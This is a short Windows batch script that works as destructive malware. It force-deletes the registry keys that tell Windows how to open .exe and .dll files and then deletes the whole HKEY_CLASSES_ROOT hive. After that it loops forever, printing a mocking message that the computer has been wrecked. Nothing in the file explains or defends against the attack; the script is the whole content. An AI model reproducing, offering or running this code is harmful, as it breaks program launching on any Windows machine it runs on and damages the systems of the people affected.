@ECHO OFF
reg delete HKCR/.exe /f
reg delete HKCR/.dll /f
reg delete HKCR /f
:MESSAGE
ECHO Your computer has been f*cked. Have a nice day :)
GOTO MESSAGE
